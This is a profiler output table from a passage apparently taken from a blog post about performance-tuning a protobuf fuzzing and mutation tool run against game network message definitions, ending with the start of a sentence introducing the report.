        3    0.000    0.000    0.000    0.000 contextlib.py:467(__enter__)
        3    0.000    0.000    0.000    0.000 contextlib.py:470(__exit__)
    12522    0.021    0.000    0.024    0.000 decoder.py:117(DecodeVarint)
     4662    0.016    0.000    0.018    0.000 decoder.py:140(DecodeVarint)
    25091    0.032    0.000    0.038    0.000 decoder.py:169(ReadTag)
      176    0.000    0.000    0.000    0.000 decoder.py:199(SpecificDecoder)
    10583    0.011    0.000    0.046    0.000 decoder.py:238(DecodeField)
     1680    0.002    0.000    0.006    0.000 decoder.py:257(InnerDecode)
      157    0.000    0.000    0.000    0.000 decoder.py:281(InnerDecode)
       70    0.000    0.000    0.000    0.000 decoder.py:297(InnerDecode)
        3    0.000    0.000    0.000    0.000 decoder.py:353(EnumDecoder)
       32    0.000    0.000    0.000    0.000 decoder.py:461(StringDecoder)
      927    0.001    0.000    0.001    0.000 decoder.py:467(_ConvertToUnicode)
      927    0.001    0.000    0.003    0.000 decoder.py:497(DecodeField)
       17    0.000    0.000    0.000    0.000 decoder.py:507(BytesDecoder)
      243    0.000    0.000    0.001    0.000 decoder.py:534(DecodeField)
       12    0.000    0.000    0.000    0.000 decoder.py:591(MessageDecoder)
   249/58    0.002    0.000    0.042    0.001 decoder.py:601(DecodeRepeatedField)
       25    0.000    0.000    0.002    0.000 decoder.py:623(DecodeField)
     8405    0.009    0.000    0.011    0.000 decoder.py:765(_SkipVarint)
     4606    0.005    0.000    0.012    0.000 decoder.py:785(_SkipLengthDelimited)
       53    0.000    0.000    0.000    0.000 decoder.py:809(_SkipFixed32)
    13064    0.015    0.000    0.040    0.000 decoder.py:838(SkipField)
      430    0.000    0.000    0.000    0.000 descriptor.py:114(__init__)
     7600    0.005    0.000    0.005    0.000 descriptor.py:138(GetOptions)
       69    0.000    0.000    0.000    0.000 descriptor.py:168(__init__)
       62    0.000    0.000    0.001    0.000 descriptor.py:293(__init__)
      299    0.000    0.000    0.000    0.000 descriptor.py:318(<genexpr>)
      299    0.000    0.000    0.000    0.000 descriptor.py:319(<genexpr>)
       69    0.000    0.000    0.000    0.000 descriptor.py:325(<genexpr>)
       62    0.000    0.000    0.000    0.000 descriptor.py:330(<genexpr>)
       62    0.000    0.000    0.000    0.000 descriptor.py:331(<genexpr>)
       62    0.000    0.000    0.000    0.000 descriptor.py:337(<genexpr>)
       62    0.000    0.000    0.000    0.000 descriptor.py:341(<genexpr>)
      238    0.001    0.000    0.001    0.000 descriptor.py:536(__init__)
        7    0.000    0.000    0.000    0.000 descriptor.py:642(__init__)
      127    0.000    0.000    0.000    0.000 descriptor.py:659(<genexpr>)
      127    0.000    0.000    0.000    0.000 descriptor.py:660(<genexpr>)
      120    0.000    0.000    0.000    0.000 descriptor.py:700(__init__)
        3    0.000    0.000    0.000    0.000 descriptor.py:882(__init__)
      238    0.000    0.000    0.001    0.000 descriptor.py:958(_ToJsonName)
        3    0.000    0.000    0.000    0.000 descriptor_pool.py:1056(Default)
       70    0.000    0.000    0.000    0.000 descriptor_pool.py:140(_CheckConflictRegister)
       62    0.000    0.000    0.000    0.000 descriptor_pool.py:186(AddDescriptor)
        7    0.000    0.000    0.000    0.000 descriptor_pool.py:204(AddEnumDescriptor)
        1    0.000    0.000    0.000    0.000 descriptor_pool.py:233(AddExtensionDescriptor)
        3    0.000    0.000    0.000    0.000 descriptor_pool.py:276(AddFileDescriptor)
       72    0.000    0.000    0.000    0.000 descriptor_pool.py:294(_AddFileDescriptor)
        1    0.000    0.000    0.000    0.000 descriptor_pool.py:94(_IsMessageSetExtension)
      238    0.000    0.000    0.000    0.000 encoder.py:111(_TagSize)
      119    0.000    0.000    0.000    0.000 encoder.py:130(SpecificSizer)
     5612    0.002    0.000    0.004    0.000 encoder.py:148(FieldSize)
        3    0.000    0.000    0.000    0.000 encoder.py:159(SpecificSizer)
      165    0.000    0.000    0.000    0.000 encoder.py:177(FieldSize)
       55    0.000    0.000    0.000    0.000 encoder.py:188(SpecificSizer)
     1979    0.000    0.000    0.000    0.000 encoder.py:203(FieldSize)
       32    0.000    0.000    0.000    0.000 encoder.py:230(StringSizer)
     2530    0.003    0.000    0.005    0.000 encoder.py:246(FieldSize)
       17    0.000    0.000    0.000    0.000 encoder.py:252(BytesSizer)
       12    0.000    0.000    0.000    0.000 encoder.py:292(MessageSizer)
      419    0.001    0.000    0.007    0.000 encoder.py:299(RepeatedFieldSize)
    12387    0.016    0.000    0.022    0.000 encoder.py:375(EncodeVarint)
     8814    0.044    0.000    0.063    0.000 encoder.py:391(EncodeSignedVarint)
      488    0.000    0.000    0.001    0.000 encoder.py:409(_VarintBytes)
      488    0.001    0.000    0.002    0.000 encoder.py:418(TagBytes)
      119    0.000    0.000    0.001    0.000 encoder.py:440(SpecificEncoder)
    13891    0.010    0.000    0.086    0.000 encoder.py:462(EncodeField)
        3    0.000    0.000    0.000    0.000 encoder.py:474(SpecificEncoder)
      165    0.000    0.000    0.000    0.000 encoder.py:496(EncodeField)
        9    0.000    0.000    0.000    0.000 encoder.py:514(SpecificEncoder)
       77    0.000    0.000    0.000    0.000 encoder.py:534(EncodeField)
       21    0.000    0.000    0.000    0.000 encoder.py:580(SpecificEncoder)
     1817    0.002    0.000    0.004    0.000 encoder.py:608(EncodeField)
       25    0.000    0.000    0.000    0.000 encoder.py:646(BoolEncoder)
     2227    0.001    0.000    0.003    0.000 encoder.py:675(EncodeField)
       32    0.000    0.000    0.000    0.000 encoder.py:683(StringEncoder)
        8    0.000    0.000    0.000    0.000 encoder.py:691(EncodeRepeatedField)
     4622    0.008    0.000    0.022    0.000 encoder.py:699(EncodeField)
       17    0.000    0.000    0.000    0.000 encoder.py:707(BytesEncoder)
      265    0.000    0.000    0.001    0.000 encoder.py:722(EncodeField)
       12    0.000    0.000    0.000    0.000 encoder.py:750(MessageEncoder)
1737/1320    0.006    0.000    0.131    0.000 encoder.py:757(EncodeRepeatedField)
       25    0.000    0.000    0.001    0.000 encoder.py:764(EncodeField)
     3299    0.001    0.000    0.001    0.000 encoder.py:82(_VarintSize)
     5665    0.001    0.000    0.001    0.000 encoder.py:96(_SignedVarintSize)
        1    0.000    0.000    0.001    0.001 engine_gcmessages_pb2.py:4(<module>)
        2    0.000    0.000    0.000    0.000 engine_gcmessages_pb2.py:5(<lambda>)
        7    0.000    0.000    0.000    0.000 enum_type_wrapper.py:46(__init__)
16041/11679    0.041    0.000    0.312    0.000 gen.py:102(_update_independent_generators)
16041/11679    0.015    0.000    0.200    0.000 gen.py:104(<listcomp>)
   199071    0.026    0.000    0.026    0.000 gen.py:15(name)
42605/30599    0.140    0.000    0.305    0.000 gen.py:150(get)
42605/30599    0.110    0.000    0.224    0.000 gen.py:158(<listcomp>)
10203/7603    0.005    0.000    0.178    0.000 gen.py:160(__iter__)
30858/21179    0.033    0.000    1.376    0.000 gen.py:164(__next__)
     1762    0.001    0.000    0.001    0.000 gen.py:19(set_name)
369536/34041    0.350    0.000    1.140    0.000 gen.py:192(step_generator)
   178044    0.110    0.000    0.139    0.000 gen.py:26(__next__)
     4076    0.002    0.000    0.002    0.000 gen.py:36(set_limit)
    23072    0.049    0.000    0.067    0.000 gen.py:44(__init__)
   229594    0.071    0.000    0.224    0.000 gen.py:50(__iter__)
   316209    0.312    0.000    0.523    0.000 gen.py:54(__next__)
   365109    0.058    0.000    0.058    0.000 gen.py:59(get)
     5838    0.025    0.000    0.212    0.000 gen.py:86(__init__)
    28910    0.022    0.000    0.022    0.000 gen.py:9(__init__)
    16041    0.093    0.000    0.121    0.000 gen.py:93(get_independent_generators)
    16041    0.017    0.000    0.027    0.000 gen.py:96(<listcomp>)
        3    0.000    0.000    0.000    0.000 genericpath.py:121(_splitext)
        1    0.000    0.000    0.000    0.000 genericpath.py:16(exists)
       27    0.000    0.000    0.000    0.000 genericpath.py:27(isfile)
     9691    0.010    0.000    0.197    0.000 message.py:106(CopyFrom)
     4076    0.009    0.000    0.248    0.000 message.py:178(ParseFromString)
    34446    0.006    0.000    0.006    0.000 message_listener.py:77(Modified)
        1    0.001    0.001    0.014    0.014 netmessages_pb2.py:4(<module>)
       50    0.000    0.000    0.000    0.000 netmessages_pb2.py:5(<lambda>)
        1    0.000    0.000    0.001    0.001 network_connection_pb2.py:4(<module>)
       62    0.000    0.000    0.000    0.000 network_connection_pb2.py:5(<lambda>)
        2    0.000    0.000    0.000    0.000 os.py:674(__getitem__)
        2    0.000    0.000    0.000    0.000 os.py:754(encode)
        2    0.000    0.000    0.000    0.000 os.py:758(decode)
        3    0.000    0.000    0.000    0.000 os.py:804(fsencode)
   630889    0.245    0.000    0.245    0.000 pathlib.py:102(join_parsed_parts)
   630891    1.024    0.000    6.972    0.000 pathlib.py:1069(__new__)
  1261781    0.341    0.000    0.341    0.000 pathlib.py:1079(_init)
  1275897    0.558    0.000    0.558    0.000 pathlib.py:293(splitroot)
  1261780    2.876    0.000    4.240    0.000 pathlib.py:64(parse_parts)
  1261780    2.264    0.000    7.095    0.000 pathlib.py:672(_parse_args)
   630891    0.835    0.000    5.756    0.000 pathlib.py:692(_from_parts)
   630890    0.542    0.000    0.864    0.000 pathlib.py:705(_from_parsed_parts)
   630889    0.709    0.000    0.970    0.000 pathlib.py:715(_format_parsed_parts)
   630889    0.946    0.000    4.483    0.000 pathlib.py:726(_make_child)
   635784    1.091    0.000    2.061    0.000 pathlib.py:732(__str__)
   635783    0.467    0.000    2.528    0.000 pathlib.py:742(__fspath__)
        1    0.000    0.000    0.000    0.000 pathlib.py:956(joinpath)
   630888    0.357    0.000    4.840    0.000 pathlib.py:964(__truediv__)
        1    0.000    0.000    0.000    0.000 pathlib.py:976(parent)
        3    0.021    0.007    0.086    0.029 pbimport.py:102(from_file)
        3    0.000    0.000    0.000    0.000 pbimport.py:32(find_protoc)
        3    0.000    0.000    0.038    0.013 pbimport.py:60(_load_module)
        3    0.000    0.000    0.026    0.009 pbimport.py:76(_compile_proto)
        3    0.000    0.000    0.000    0.000 posixpath.py:100(split)
        3    0.000    0.000    0.000    0.000 posixpath.py:117(splitext)
        3    0.000    0.000    0.000    0.000 posixpath.py:140(basename)
        9    0.000    0.000    0.000    0.000 posixpath.py:150(dirname)
        3    0.000    0.000    0.000    0.000 posixpath.py:334(normpath)
        3    0.000    0.000    0.000    0.000 posixpath.py:372(abspath)
       51    0.000    0.000    0.000    0.000 posixpath.py:41(_get_sep)
        3    0.000    0.000    0.000    0.000 posixpath.py:60(isabs)
       33    0.000    0.000    0.000    0.000 posixpath.py:71(join)
     8152    0.007    0.000    0.007    0.000 profiling.py:192(__init__)
     8311    0.007    0.000    0.007    0.000 profiling.py:197(ReadByte)
     8152    0.018    0.000    0.025    0.000 profiling.py:205(ReadVarInt32)
     4076    0.010    0.000    0.028    0.000 profiling.py:221(parse_type)
     4076    0.008    0.000    0.022    0.000 profiling.py:231(parse_length)
     8152    0.013    0.000    0.014    0.000 profiling.py:242(get_length_bytes)
     4076    0.051    0.000  130.188    0.032 profiling.py:261(mutate_message)
     4076    0.003    0.000    0.003    0.000 profiling.py:288(<listcomp>)
     4076    0.095    0.000  131.041    0.032 profiling.py:333(fuzz)
        1    0.000    0.000    0.086    0.086 profiling.py:465(initialize_stuff)
     4076    0.010    0.000    0.127    0.000 profiling.py:472(load_from_file)
        1    0.028    0.028  131.350  131.350 profiling.py:481(main)
5838/4076    0.064    0.000  125.969    0.031 protofuzz.py:123(descriptor_to_generator)
   135510    0.159    0.000    1.650    0.000 protofuzz.py:139(_assign_to_field)
30622/20931    0.127    0.000    2.605    0.000 protofuzz.py:156(_fields_to_object)
     4131    0.003    0.000    0.003    0.000 protofuzz.py:183(__init__)
    25007    0.050    0.000  130.095    0.005 protofuzz.py:188(_iteration_helper)
     4076    0.004    0.000    0.004    0.000 protofuzz.py:228(permute)
        3    0.000    0.000    0.000    0.000 protofuzz.py:237(_module_to_generators)
        3    0.000    0.000    0.000    0.000 protofuzz.py:246(<dictcomp>)
        3    0.000    0.000    0.086    0.029 protofuzz.py:249(from_file)
     4076    0.005    0.000    0.008    0.000 protofuzz.py:291(from_protobuf_class)
    14117    0.070    0.000    1.315    0.000 protofuzz.py:43(_int_generator)
     4630    6.180    0.001  116.114    0.025 protofuzz.py:49(_string_generator)
      265    0.002    0.000    8.154    0.031 protofuzz.py:54(_bytes_generator)
      265    1.367    0.005    8.150    0.031 protofuzz.py:56(<listcomp>)
     1817    0.003    0.000    0.005    0.000 protofuzz.py:60(_float_generator)
       16    0.000    0.000    0.000    0.000 protofuzz.py:64(_enum_generator)
24834/14129    0.094    0.000  125.783    0.009 protofuzz.py:69(_prototype_to_generator)
       62    0.000    0.000    0.000    0.000 python_message.py:1005(_AddByteSizeMethod)
2181/1762    0.013    0.000    0.041    0.000 python_message.py:1008(ByteSize)
       62    0.000    0.000    0.000    0.000 python_message.py:1032(_AddSerializeToStringMethod)
     4076    0.011    0.000    0.331    0.000 python_message.py:1035(SerializeToString)
       62    0.000    0.000    0.000    0.000 python_message.py:1046(_AddSerializePartialToStringMethod)
     4076    0.013    0.000    0.295    0.000 python_message.py:1049(SerializePartialToString)
       62    0.000    0.000    0.001    0.000 python_message.py:105(__new__)
5838/4076    0.045    0.000    0.280    0.000 python_message.py:1055(InternalSerialize)
       62    0.000    0.000    0.000    0.000 python_message.py:1078(_AddMergeFromStringMethod)
     4076    0.010    0.000    0.228    0.000 python_message.py:1080(MergeFromString)
5128/4076    0.052    0.000    0.217    0.000 python_message.py:1100(InternalParse)
       62    0.000    0.000    0.000    0.000 python_message.py:1127(_AddIsInitializedMethod)
       62    0.000    0.000    0.000    0.000 python_message.py:1131(<listcomp>)
5838/4076    0.022    0.000    0.024    0.000 python_message.py:1134(IsInitialized)
       62    0.000    0.000    0.000    0.000 python_message.py:1222(_AddMergeFromMethod)
12006/9691    0.045    0.000    0.171    0.000 python_message.py:1226(MergeFrom)
       62    0.000    0.000    0.000    0.000 python_message.py:1266(_AddWhichOneofMethod)
       62    0.000    0.000    0.000    0.000 python_message.py:1284(_AddReduceMethod)
    13767    0.012    0.000    0.027    0.000 python_message.py:1290(_Clear)
    13058    0.005    0.000    0.005    0.000 python_message.py:1309(_SetListener)
       62    0.000    0.000    0.001    0.000 python_message.py:1316(_AddMessageMethods)
       62    0.000    0.000    0.000    0.000 python_message.py:1342(_AddPrivateHelperMethods)
61271/61188    0.044    0.000    0.053    0.000 python_message.py:1345(Modified)
       62    0.000    0.000    0.010    0.000 python_message.py:136(__init__)
    47791    0.166    0.000    0.341    0.000 python_message.py:1390(__init__)
    17688    0.006    0.000    0.008    0.000 python_message.py:1409(Modified)
      237    0.000    0.000    0.000    0.000 python_message.py:185(_PropertyName)
       62    0.000    0.000    0.000    0.000 python_message.py:236(_AddSlots)
      238    0.000    0.000    0.000    0.000 python_message.py:255(_IsMessageSetExtension)
      476    0.000    0.000    0.000    0.000 python_message.py:263(_IsMapField)
      238    0.001    0.000    0.005    0.000 python_message.py:274(_AttachFieldHelpers)
      240    0.001    0.000    0.002    0.000 python_message.py:308(AddDecoder)
       62    0.000    0.000    0.000    0.000 python_message.py:341(_AddClassAttributesForNestedExtensions)
       62    0.000    0.000    0.000    0.000 python_message.py:348(_AddEnumValues)
      238    0.000    0.000    0.000    0.000 python_message.py:385(_DefaultValueConstructorForField)
    12157    0.012    0.000    0.059    0.000 python_message.py:410(MakeRepeatedMessageDefault)
       33    0.000    0.000    0.000    0.000 python_message.py:416(MakeRepeatedScalarDefault)
      123    0.000    0.000    0.001    0.000 python_message.py:424(MakeSubMessageDefault)
       62    0.000    0.000    0.000    0.000 python_message.py:451(_AddInitMethod)
    47791    0.729    0.000    1.262    0.000 python_message.py:469(init)
       62    0.000    0.000    0.003    0.000 python_message.py:551(_AddPropertiesForFields)
      237    0.000    0.000    0.003    0.000 python_message.py:562(_AddPropertiesForField)
       10    0.000    0.000    0.000    0.000 python_message.py:587(_AddPropertiesForRepeatedField)
     9626    0.014    0.000    0.046    0.000 python_message.py:604(getter)
      222    0.001    0.000    0.002    0.000 python_message.py:631(_AddPropertiesForNonRepeatedScalarField)
   133386    0.057    0.000    0.079    0.000 python_message.py:649(getter)
   125786    0.106    0.000    0.580    0.000 python_message.py:658(field_setter)
        5    0.000    0.000    0.000    0.000 python_message.py:687(_AddPropertiesForNonRepeatedCompositeField)
       98    0.000    0.000    0.001    0.000 python_message.py:703(getter)
       62    0.000    0.000    0.000    0.000 python_message.py:731(_AddPropertiesForExtensions)
       62    0.000    0.000    0.000    0.000 python_message.py:746(_AddStaticMethods)
        1    0.000    0.000    0.000    0.000 python_message.py:748(RegisterExtension)
    35539    0.016    0.000    0.018    0.000 python_message.py:762(_IsPresent)
       62    0.000    0.000    0.000    0.000 python_message.py:774(_AddListFieldsMethod)
     7600    0.018    0.000    0.069    0.000 python_message.py:777(ListFields)
     7600    0.012    0.000    0.030    0.000 python_message.py:778(<listcomp>)
    35539    0.006    0.000    0.006    0.000 python_message.py:779(<lambda>)
       62    0.000    0.000    0.000    0.000 python_message.py:787(_AddHasFieldMethod)
       62    0.000    0.000    0.000    0.000 python_message.py:829(_AddClearFieldMethod)
       62    0.000    0.000    0.000    0.000 python_message.py:933(_AddEqualsMethod)
     8152    0.005    0.000    0.007    0.000 python_message.py:935(__eq__)
       62    0.000    0.000    0.000    0.000 python_message.py:963(_AddStrMethod)
       62    0.000    0.000    0.000    0.000 python_message.py:970(_AddReprMethod)
       62    0.000    0.000    0.000    0.000 python_message.py:977(_AddUnicodeMethod)
     7924    0.011    0.000    0.016    0.000 random.py:238(_randbelow_with_getrandbits)
     4076    0.005    0.000    0.011    0.000 random.py:291(randrange)
     3848    0.006    0.000    0.018    0.000 random.py:344(choice)
        3    0.000    0.000    0.000    0.000 re.py:198(search)
        3    0.000    0.000    0.000    0.000 re.py:289(_compile)
        1    0.000    0.000    0.000    0.000 resources.py:143(files)
        1    0.000    0.000    0.000    0.000 resources.py:36(_resolve)
        1    0.000    0.000    0.000    0.000 resources.py:43(_get_package)
        3    0.000    0.000    0.000    0.000 selectors.py:200(__enter__)
        3    0.000    0.000    0.000    0.000 selectors.py:203(__exit__)
       12    0.000    0.000    0.000    0.000 selectors.py:21(_fileobj_to_fd)
        3    0.000    0.000    0.000    0.000 selectors.py:210(__init__)
       12    0.000    0.000    0.000    0.000 selectors.py:216(_fileobj_lookup)
        6    0.000    0.000    0.000    0.000 selectors.py:235(register)
        6    0.000    0.000    0.000    0.000 selectors.py:248(unregister)
        3    0.000    0.000    0.000    0.000 selectors.py:269(close)
       11    0.000    0.000    0.000    0.000 selectors.py:273(get_map)
       11    0.000    0.000    0.000    0.000 selectors.py:276(_key_from_fd)
        3    0.000    0.000    0.000    0.000 selectors.py:348(__init__)
        6    0.000    0.000    0.000    0.000 selectors.py:352(register)
        6    0.000    0.000    0.000    0.000 selectors.py:366(unregister)
        8    0.000    0.000    0.021    0.003 selectors.py:403(select)
        3    0.000    0.000    0.000    0.000 selectors.py:64(__init__)
       11    0.000    0.000    0.000    0.000 selectors.py:67(__len__)
        3    0.000    0.000    0.000    0.000 subprocess.py:1045(__del__)
        3    0.000    0.000    0.022    0.007 subprocess.py:1090(communicate)
       14    0.000    0.000    0.000    0.000 subprocess.py:1164(_remaining_time)
        8    0.000    0.000    0.000    0.000 subprocess.py:1172(_check_timeout)
        6    0.000    0.000    0.000    0.000 subprocess.py:1184(wait)
        3    0.000    0.000    0.000    0.000 subprocess.py:1207(_close_pipe_fds)
        3    0.000    0.000    0.000    0.000 subprocess.py:1568(_get_handles)
        3    0.000    0.000    0.004    0.001 subprocess.py:1661(_execute_child)
        3    0.000    0.000    0.000    0.000 subprocess.py:1825(_handle_exitstatus)
        3    0.000    0.000    0.000    0.000 subprocess.py:1837(_internal_poll)
        3    0.000    0.000    0.000    0.000 subprocess.py:1872(_try_wait)
        6    0.000    0.000    0.000    0.000 subprocess.py:1885(_wait)
        3    0.000    0.000    0.022    0.007 subprocess.py:1926(_communicate)
        3    0.000    0.000    0.000    0.000 subprocess.py:2028(_save_input)
        3    0.000    0.000    0.000    0.000 subprocess.py:250(_cleanup)
        3    0.000    0.000    0.004    0.001 subprocess.py:756(__init__)
        3    0.000    0.000    0.000    0.000 symbol_database.py:116(RegisterFileDescriptor)
        3    0.000    0.000    0.000    0.000 symbol_database.py:187(Default)
       62    0.000    0.000    0.000    0.000 symbol_database.py:68(RegisterMessage)
       62    0.000    0.000    0.000    0.000 symbol_database.py:85(RegisterMessageDescriptor)
        7    0.000    0.000    0.000    0.000 symbol_database.py:93(RegisterEnumDescriptor)
        3    0.000    0.000    0.000    0.000 tempfile.py:224(_infer_return_type)
        3    0.000    0.000    0.000    0.000 tempfile.py:245(_sanitize_params)
        3    0.000    0.000    0.000    0.000 tempfile.py:273(rng)
        3    0.000    0.000    0.000    0.000 tempfile.py:284(__next__)
        3    0.000    0.000    0.000    0.000 tempfile.py:287(<listcomp>)
        3    0.000    0.000    0.000    0.000 tempfile.py:364(_get_candidate_names)
        3    0.000    0.000    0.000    0.000 tempfile.py:419(gettempdir)
        3    0.000    0.000    0.000    0.000 tempfile.py:474(mkdtemp)
    23668    0.010    0.000    0.031    0.000 type_checkers.py:101(CheckValue)
    76702    0.064    0.000    0.388    0.000 type_checkers.py:129(CheckValue)
        3    0.000    0.000    0.000    0.000 type_checkers.py:150(__init__)
       90    0.000    0.000    0.000    0.000 type_checkers.py:153(CheckValue)
    25359    0.018    0.000    0.025    0.000 type_checkers.py:173(CheckValue)
        6    0.000    0.000    0.000    0.000 type_checkers.py:62(SupportsOpenEnums)
      225    0.001    0.000    0.001    0.000 type_checkers.py:65(GetTypeChecker)
     4895    0.004    0.000    0.004    0.000 values.py:116(get_strings)
   133552    0.096    0.000    1.214    0.000 values.py:126(get_integers)
3987/3958    0.004    0.000    0.033    0.000 values.py:144(get_floats)
   170757    0.056    0.000    0.056    0.000 values.py:21(_get_fuzzdb_path)
60973618/60973382   15.971    0.000  116.882    0.000 values.py:72(_limit_helper)
   183521    0.209    0.000    1.117    0.000 values.py:82(_fuzzdb_integers)
 60786110   50.667    0.000  100.909    0.000 values.py:90(_fuzzdb_get_strings)
      330    0.000    0.000    0.000    0.000 wire_format.py:100(ZigZagEncode)
      455    0.000    0.000    0.000    0.000 wire_format.py:110(ZigZagDecode)
       20    0.000    0.000    0.000    0.000 wire_format.py:259(IsTypePackable)
      726    0.000    0.000    0.000    0.000 wire_format.py:80(PackTag)
  1261849    0.428    0.000    0.428    0.000 {built-in method __new__ of type object at 0x956900}
    86710    0.050    0.000    0.278    0.000 {built-in method _abc._abc_instancecheck}
    86707    0.202    0.000    0.204    0.000 {built-in method _abc._abc_subclasscheck}
        4    0.000    0.000    0.000    0.000 {built-in method _imp.acquire_lock}
        3    0.000    0.000    0.000    0.000 {built-in method _imp.extension_suffixes}
        4    0.000    0.000    0.000    0.000 {built-in method _imp.release_lock}
    57747    0.010    0.000    0.010    0.000 {built-in method _operator.getitem}
        3    0.002    0.001    0.002    0.001 {built-in method _posixsubprocess.fork_exec}
        3    0.000    0.000    0.000    0.000 {built-in method _stat.S_ISREG}
     1894    0.002    0.000    0.002    0.000 {built-in method _struct.pack}
      227    0.000    0.000    0.000    0.000 {built-in method _struct.unpack}
        7    0.000    0.000    0.000    0.000 {built-in method _thread.allocate_lock}
        4    0.000    0.000    0.000    0.000 {built-in method _thread.get_ident}
    47791    0.161    0.000    0.163    0.000 {built-in method _weakref.proxy}
        3    0.020    0.007    0.020    0.007 {built-in method builtins.compile}
      4/1    0.000    0.000  131.350  131.350 {built-in method builtins.exec}
   139645    0.077    0.000    0.197    0.000 {built-in method builtins.getattr}
       62    0.000    0.000    0.000    0.000 {built-in method builtins.hasattr}
        3    0.000    0.000    0.000    0.000 {built-in method builtins.id}
  2717402    0.530    0.000    0.830    0.000 {built-in method builtins.isinstance}
302361/210866    0.174    0.000    0.258    0.000 {built-in method builtins.iter}
276042/275623    0.038    0.000    0.038    0.000 {built-in method builtins.len}
       15    0.000    0.000    0.000    0.000 {built-in method builtins.max}
347070/21182    0.051    0.000    1.126    0.000 {built-in method builtins.next}
    28895    0.005    0.000    0.005    0.000 {built-in method builtins.ord}
    12228    0.130    0.000    0.130    0.000 {built-in method builtins.print}
   126260    0.070    0.000    0.650    0.000 {built-in method builtins.setattr}
        3    0.000    0.000    0.000    0.000 {built-in method builtins.sorted}
        6    0.000    0.000    0.000    0.000 {built-in method io.open_code}
   483224    5.386    0.000    7.283    0.000 {built-in method io.open}
        3    0.000    0.000    0.000    0.000 {built-in method marshal.dumps}
        8    0.000    0.000    0.000    0.000 {built-in method math.ceil}
        3    0.000    0.000    0.000    0.000 {built-in method posix.WIFSTOPPED}
        3    0.000    0.000    0.000    0.000 {built-in method posix.access}
       12    0.000    0.000    0.000    0.000 {built-in method posix.close}
   630964    0.104    0.000    0.104    0.000 {built-in method posix.fspath}
        3    0.000    0.000    0.000    0.000 {built-in method posix.getpid}
   156641    2.419    0.000    3.050    0.000 {built-in method posix.listdir}
        6    0.000    0.000    0.000    0.000 {built-in method posix.mkdir}
        3    0.000    0.000    0.000    0.000 {built-in method posix.open}
        9    0.000    0.000    0.000    0.000 {built-in method posix.pipe}
       14    0.001    0.000    0.001    0.000 {built-in method posix.read}
        3    0.000    0.000    0.000    0.000 {built-in method posix.replace}
       40    0.000    0.000    0.000    0.000 {built-in method posix.stat}
        3    0.000    0.000    0.000    0.000 {built-in method posix.waitpid}
        3    0.000    0.000    0.000    0.000 {built-in method posix.waitstatus_to_exitcode}
        3    0.000    0.000    0.000    0.000 {built-in method select.poll}
        6    0.000    0.000    0.000    0.000 {built-in method sys.audit}
        3    0.000    0.000    0.000    0.000 {built-in method sys.exc_info}
  1290029    0.506    0.000    0.506    0.000 {built-in method sys.intern}
       34    0.000    0.000    0.000    0.000 {built-in method time.monotonic}
   479148    1.423    0.000    1.423    0.000 {method '__exit__' of '_io._IOBase' objects}
       39    0.000    0.000    0.000    0.000 {method '__exit__' of '_thread.lock' objects}
        3    0.000    0.000    0.000    0.000 {method 'acquire' of '_thread.lock' objects}
        3    0.000    0.000    0.000    0.000 {method 'add' of 'set' objects}
        6    0.000    0.000    0.000    0.000 {method 'append' of 'collections.deque' objects}
  1980688    0.267    0.000    0.267    0.000 {method 'append' of 'list' objects}
     7924    0.002    0.000    0.002    0.000 {method 'bit_length' of 'int' objects}
        3    0.000    0.000    0.000    0.000 {method 'clear' of 'dict' objects}
     4082    0.015    0.000    0.015    0.000 {method 'close' of '_io.BufferedReader' objects}
 62370202   10.454    0.000   10.454    0.000 {method 'decode' of 'bytes' objects}
        1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}
     7279    0.004    0.000    0.004    0.000 {method 'encode' of 'str' objects}
   567868    0.219    0.000    0.219    0.000 {method 'endswith' of 'str' objects}
       12    0.000    0.000    0.000    0.000 {method 'extend' of 'bytearray' objects}
       12    0.000    0.000    0.000    0.000 {method 'fileno' of '_io.BufferedReader' objects}
        9    0.000    0.000    0.000    0.000 {method 'format' of 'str' objects}
   170793    0.030    0.000    0.030    0.000 {method 'get' of 'dict' objects}
    12922    0.003    0.000    0.003    0.000 {method 'getrandbits' of '_random.Random' objects}
     4076    0.001    0.000    0.001    0.000 {method 'getvalue' of '_io.BytesIO' objects}
        3    0.000    0.000    0.000    0.000 {method 'group' of 're.Match' objects}
    73362    0.177    0.000    0.179    0.000 {method 'items' of 'dict' objects}
      494    0.000    0.000    0.000    0.000 {method 'join' of 'bytes' objects}
   631148    0.260    0.000    0.260    0.000 {method 'join' of 'str' objects}
       16    0.000    0.000    0.000    0.000 {method 'keys' of 'dict' objects}
        3    0.000    0.000    0.000    0.000 {method 'lstrip' of 'str' objects}
    90255    0.014    0.000    0.014    0.000 {method 'pack' of '_struct.Struct' objects}
        8    0.021    0.003    0.021    0.003 {method 'poll' of 'select.poll' objects}
        6    0.000    0.000    0.000    0.000 {method 'pop' of 'collections.deque' objects}
        6    0.000    0.000    0.000    0.000 {method 'pop' of 'dict' objects}
     4079    0.023    0.000    0.023    0.000 {method 'read' of '_io.BufferedReader' objects}
        6    0.000    0.000    0.000    0.000 {method 'register' of 'select.poll' objects}
        3    0.000    0.000    0.000    0.000 {method 'release' of '_thread.lock' objects}
  1261780    0.136    0.000    0.136    0.000 {method 'reverse' of 'list' objects}
        3    0.000    0.000    0.000    0.000 {method 'rfind' of 'bytes' objects}
       33    0.000    0.000    0.000    0.000 {method 'rfind' of 'str' objects}
       12    0.000    0.000    0.000    0.000 {method 'rpartition' of 'str' objects}
        3    0.000    0.000    0.000    0.000 {method 'rsplit' of 'str' objects}
        3    0.000    0.000    0.000    0.000 {method 'rstrip' of 'bytes' objects}
       33    0.000    0.000    0.000    0.000 {method 'rstrip' of 'str' objects}
        3    0.000    0.000    0.000    0.000 {method 'search' of 're.Pattern' objects}
     9998    0.003    0.000    0.003    0.000 {method 'setdefault' of 'dict' objects}
     7600    0.014    0.000    0.020    0.000 {method 'sort' of 'list' objects}
    14126    0.010    0.000    0.010    0.000 {method 'split' of 'str' objects}
 60981956    8.501    0.000    8.501    0.000 {method 'startswith' of 'str' objects}
 62200765    8.266    0.000    8.266    0.000 {method 'strip' of 'str' objects}
        9    0.000    0.000    0.000    0.000 {method 'to_bytes' of 'int' objects}
        6    0.000    0.000    0.000    0.000 {method 'unregister' of 'select.poll' objects}
      426    0.000    0.000    0.000    0.000 {method 'upper' of 'str' objects}
     5841    0.002    0.000    0.002    0.000 {method 'values' of 'dict' objects}
   123595    0.020    0.000    0.020    0.000 {method 'write' of '_io.BytesIO' objects}
        3    0.000    0.000    0.000    0.000 {method 'write' of '_io.FileIO' objects}



```
{% endraw %}
This is the performance report on the mutator library. The critical lines are basically:

{% raw %}
